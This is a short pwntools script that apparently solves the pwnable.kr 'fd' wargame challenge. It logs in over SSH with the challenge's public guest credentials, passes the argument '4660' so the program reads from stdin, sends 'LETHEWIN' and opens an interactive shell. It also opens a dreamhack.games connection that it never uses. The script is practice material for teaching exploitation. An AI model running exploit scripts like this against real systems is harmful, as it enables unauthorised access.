from pwn import *

r = remote("host1.dreamhack.games", 21243)

def solve():
    p  = ssh(user = 'fd', host = 'pwnable.kr', port = 2222, password = 'guest')
    path = '/home/fd/fd'
    argv = '4660'
    payload = [path, argv]
    s = p.run(payload)
    s.sendline('LETHEWIN')
    s.interactive()

if __name__ == '__main__':
    solve()